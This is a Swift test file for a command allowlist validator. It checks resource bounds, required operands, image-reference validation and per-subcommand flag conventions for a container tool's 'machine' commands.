@Test("machine set bounds cpus and memory")
func machineSetBoundsResourceValues() {
    for setting in ["cpus=0", "cpus=99999", "cpus=-1", "cpus=four", "memory=lots", "memory=8Q"] {
        #expect(throws: (any Error).self) {
            try Allowlist.validated(["machine", "set", "-n", "dev", setting])
        }
    }
}

@Test("delete and set-default REQUIRE the machine id; stop, inspect and logs do not")
func machineOperandRequirementsMatchEachLeaf() throws {
    // The asymmetry is the CLI's own and this is the right way round: a bare `machine delete`
    // would silently destroy the DEFAULT machine, so it has to be named.
    #expect(throws: (any Error).self) { try Allowlist.validated(["machine", "delete"]) }
    #expect(throws: (any Error).self) { try Allowlist.validated(["machine", "set-default"]) }

    // These three legitimately default to the default machine.
    _ = try Allowlist.validated(["machine", "stop"])
    _ = try Allowlist.validated(["machine", "inspect"])
    _ = try Allowlist.validated(["machine", "logs"])
}

@Test("machine create validates the image reference and its inline sizing")
func machineCreateValidatesImageAndSizing() throws {
    let validated = try Allowlist.validated(
        ["machine", "create", "-n", "dev", "--cpus", "4", "--memory", "8G", "alpine:3.22"])
    #expect(validated.arguments.contains("alpine:3.22"))
    #expect(validated.mutates)

    // An image reference, not a free string — same shape the rest of the allowlist uses.
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["machine", "create", "not a valid ref!!"])
    }
    // Unicode lookalikes are rejected by `.imageReference` exactly as they are elsewhere.
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["machine", "create", "аlpine:3.22"])
    }
}

@Test("the machine family does not accept each other's calling conventions")
func machineLeavesDoNotShareOneConvention() {
    // `stop` is positional-only: `-n` is not one of its flags.
    #expect(throws: (any Error).self) { try Allowlist.validated(["machine", "stop", "-n", "dev"]) }
    // `set` needs its settings; a name alone is not a command.
    #expect(throws: (any Error).self) { try Allowlist.validated(["machine", "set", "-n", "dev"]) }
    // `list` takes no operand at all.
    #expect(throws: (any Error).self) { try Allowlist.validated(["machine", "list", "dev"]) }
}
